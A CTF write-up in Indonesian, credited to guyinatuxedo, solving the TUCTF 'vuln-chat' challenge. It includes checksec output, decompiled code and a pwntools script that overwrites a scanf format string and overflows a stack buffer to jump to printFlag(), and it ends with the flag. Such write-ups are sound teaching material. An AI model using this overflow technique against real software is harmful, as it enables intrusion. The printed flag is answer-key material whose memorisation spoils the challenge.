# vuln-chat

TUCTF - Disklaim : Writeup ini milik guyinatuxedo https://github.com/guyinatuxedo/ctf/tree/master/tuctf/vuln_chat
File Link : https://github.com/guyinatuxedo/ctf/blob/master/tuctf/vuln_chat/vuln-chat

Desc : "Djinn has got some new intel for us. And I think he's giving us a second
chance. But he will only speak with you. Let's see what he's got to say."

Diberikan sebuah file ELF :
```
blaccmail@localhost:~/Downloads$ checksec vuln-chat
[*] '/home/blaccmail/Downloads/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
blaccmail@localhost:~/Downloads$ 
```

Program 32bit ini menggunakan NonExecutable stack pertama tama kita jalankan filenya :
```
blaccmail@localhost:~/Downloads$ ./vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: yee  
Welcome yee!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
yee: no u
djinn: Sorry. That's not good enough
blaccmail@localhost:~/Downloads$ 
```

Program ini meminta 2 input, yang pertama meminta nama, kemudian akan meminta inputan string lagi. Mari kita disass program ini :
```
0x080484b0  deregister_tm_clones
0x080484e0  register_tm_clones
0x08048520  __do_global_dtors_aux
0x08048540  frame_dummy
0x0804856b  printFlag
0x0804858a  main
0x08048660  __libc_csu_init
0x080486d0  __libc_csu_fini
0x080486d4  _fini
0xf7fd7900  malloc@plt
0xf7fd7910  calloc@plt
```
Menggunakan command gdb ```info functions``` kita dapat melihat semua function yang terdapat di program. Disana terdapat function ```printFlag()```. Sekarang bagaimana kita bisa memanggilnya. Sepertina teknink yang akan digunakan adalah buffer overflow. Oleh karena itu kita akan mencari berapa besar tampungan variabel input pertama :
```
----------- Welcome to vuln-chat -------------
Enter your username: aaaaaaaaaaaaaaaaaaaa
Welcome aaaaaaaaaaaaaaaaaaaa!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
aaaaaaaaaaaaaaaaaaaa: djinn: Sorry. That's not good enough
blaccmail@localhost:~/Downloads$ 
```
Mari kita lihat code-nya dengan Ida :
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char reason[20]; // [sp+3h] [bp-2Dh]@1
  char username[20]; // [sp+17h] [bp-19h]@1
  int scanf_argument; // [sp+2Bh] [bp-5h]@1
  char zero; // [sp+2Fh] [bp-1h]@1

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  scanf_argument = 's03%';
  zero = 0;
  __isoc99_scanf(&scanf_argument, username);
  printf("Welcome %s!\n", username);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", username);
  __isoc99_scanf(&scanf_argument, reason);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```
Dari kode diatas terlihat apa yang harus kita lakukan, variabel ```scanf_argument``` akan kita timpa dengan ```%s``` supaya bisa mengambil semua inputan pada ```__isoc99_scanf(&scanf_argument, reason);``` lalu dari sana kita akan overflow ```reason``` lalu panggil function ```printFlag()```. 
```
Exploit :

from pwn import *

vuln = remote("vulnchat.tuctf.com",4141)
payload = "A" * 20 + p32(0x00007325) # Timpa scanf_argument dengan "%s"
vuln.sendlineafter("Enter your username: ",payload)
payload2 = "A" * 49 + p32(0x804856b) # Alamat printFlag()
vuln.sendlineafter(": ",payload2)
print vuln.recvall()
```

# Flag : TUCTF{574ck_5m45h1n6_l1k3_4_pr0}

